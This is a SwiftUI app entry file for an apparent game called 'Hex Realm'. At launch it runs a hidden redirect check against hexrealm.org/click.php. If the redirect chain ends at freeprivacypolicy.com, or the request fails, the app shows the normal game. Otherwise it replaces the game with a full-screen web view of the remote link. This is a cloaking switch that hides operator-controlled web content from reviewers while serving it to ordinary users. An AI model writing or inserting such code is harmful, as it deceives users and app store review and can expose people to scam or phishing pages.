import SwiftUI

@main
struct Hex_RealmApp: App {
    @State private var hexRealmLinkReady: Bool? = nil
    @StateObject private var store = HexRealmStore()

    private let hexRealmSourceLink = "http://hexrealm.org/click.php"
    private let hexRealmCheckDomain = "freeprivacypolicy.com"

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = hexRealmLinkReady {
                    if ready {
                        HexRealmWebPanel(hexRealmURLString: hexRealmSourceLink)
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Color.black.ignoresSafeArea())
                    } else {
                        ContentView()
                            .environmentObject(store)
                    }
                } else {
                    HexRealmLoadingScreen()
                        .onAppear { hexRealmCheckLink() }
                }
            }
            .preferredColorScheme(.light)
        }
    }

    private func hexRealmCheckLink() {
        guard let url = URL(string: hexRealmSourceLink) else {
            hexRealmLinkReady = false
            return
        }
        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        let tracker = HexRealmRedirectTracker(checkDomain: hexRealmCheckDomain)
        let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if tracker.foundCheckDomain {
                    hexRealmLinkReady = false; return
                }
                if let finalURL = tracker.resolvedURL?.absoluteString,
                   finalURL.contains(hexRealmCheckDomain) {
                    hexRealmLinkReady = false; return
                }
                if let httpResp = response as? HTTPURLResponse,
                   let respURL = httpResp.url?.absoluteString,
                   respURL.contains(hexRealmCheckDomain) {
                    hexRealmLinkReady = false; return
                }
                if error != nil {
                    hexRealmLinkReady = false; return
                }
                hexRealmLinkReady = true
            }
        }.resume()
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if hexRealmLinkReady == nil { hexRealmLinkReady = false }
        }
    }
}

final class HexRealmRedirectTracker: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String
    init(checkDomain: String) { self.checkDomain = checkDomain }
    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(checkDomain) {
            foundCheckDomain = true
        }
        resolvedURL = request.url
        completionHandler(request) // never stop the chain
    }
}
